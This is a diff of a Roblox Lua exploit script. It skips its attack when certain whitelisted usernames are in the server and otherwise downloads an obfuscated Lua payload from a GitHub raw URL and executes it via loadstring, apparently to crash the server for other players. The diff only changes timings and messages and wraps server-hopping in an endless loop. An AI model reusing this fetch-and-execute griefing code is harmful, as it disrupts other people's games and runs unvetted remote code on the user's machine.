@@ -28,21 +28,23 @@ local function serverHop()
     end
 end 
 
-wait(3)
+wait(1)
 local whitelisttoggle = true
 local whitelisted = {"jhone_doee110101","TestAccountKRNL","egglnq","TechnoSniperX","TechnoReaperX","TechncReaperX","egglnqalt","The_NootNootLord","leakproof9853"}
 if whitelisttoggle == true then
     for i,v in pairs(whitelisted) do
         if game.Players:FindFirstChild(v) then
-          say("Your server has not been crashed due to the whitelisted user found: "..v)
+          say("Your server was spared due to the whitelisted user found: "..v)
           wait(0.4)
+          while wait(0.3) do
           task.spawn(serverHop)
+          end
         end
     end
 end
 
-print("no whitelisted people found :(")
-wait(1)
+print("no whitelisted people found D:")
+wait(2)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
 wait(0.9)
 
